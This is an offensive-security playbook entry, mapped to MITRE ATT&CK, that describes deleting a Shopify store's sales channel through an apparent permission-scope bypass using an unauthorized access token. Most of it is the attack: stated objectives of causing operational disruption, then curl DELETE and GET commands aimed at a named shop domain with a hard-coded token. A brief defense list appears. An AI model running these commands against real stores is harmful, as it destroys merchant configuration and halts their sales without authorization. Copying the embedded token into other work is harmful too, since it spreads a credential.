---
tags:
  - shopify
  - api-deletion
  - channels
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/shopify-delete-channel]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:01.745Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: a2a67387-eb83-4571-b9e1-e4e85b48c69b
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Delete-Shopify-Sales-Channel

## Summary

This procedure deletes a specific sales channel using the unauthorized token, potentially halting sales on affected platforms.

## Description

By sending a DELETE request to /admin/channels/{channel_id}.json, the attacker removes a channel without the required engineering permission, exploiting the scope bypass to alter merchant configurations and disrupt operations.

## Requirements

1. Access token with write_channels scope
2. Specific channel_id from enumeration
3. Target shop domain

## Defense

Defensive measures and detection strategies:

- Enforce permission flags on DELETE operations
- Require multi-factor approval for channel changes
- Monitor for sudden channel deletions
- Backup channel configurations

## Objectives

1. Remove active sales channel
2. Cause operational disruption
3. Demonstrate full write access

## Instructions

### Step 1: Target and Delete Channel

**Context**: Use the channel ID to issue the DELETE request.

**Command** ([[commands/shopify-delete-channel]]):
```bash
curl -X DELETE -H "X-Shopify-Access-Token: 77a01fc64f65fd16b0b38bc31694e4ce" "https://while42.myshopify.com/admin/channels/CHANNEL_ID.json"
```

> Returns 200 OK if successful.

### Step 2: Verify Deletion

**Context**: Re-list channels to confirm removal.

**Command** (Follow with GET):
```bash
curl -H "X-Shopify-Access-Token: 77a01fc64f65fd16b0b38bc31694e4ce" "https://while42.myshopify.com/admin/channels.json"
```

> Expected: Channel absent from list.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/shopify-delete-channel]]

## Tools Used


## Tags

- [[shopify]]
- [[api-deletion]]
- [[channels]]
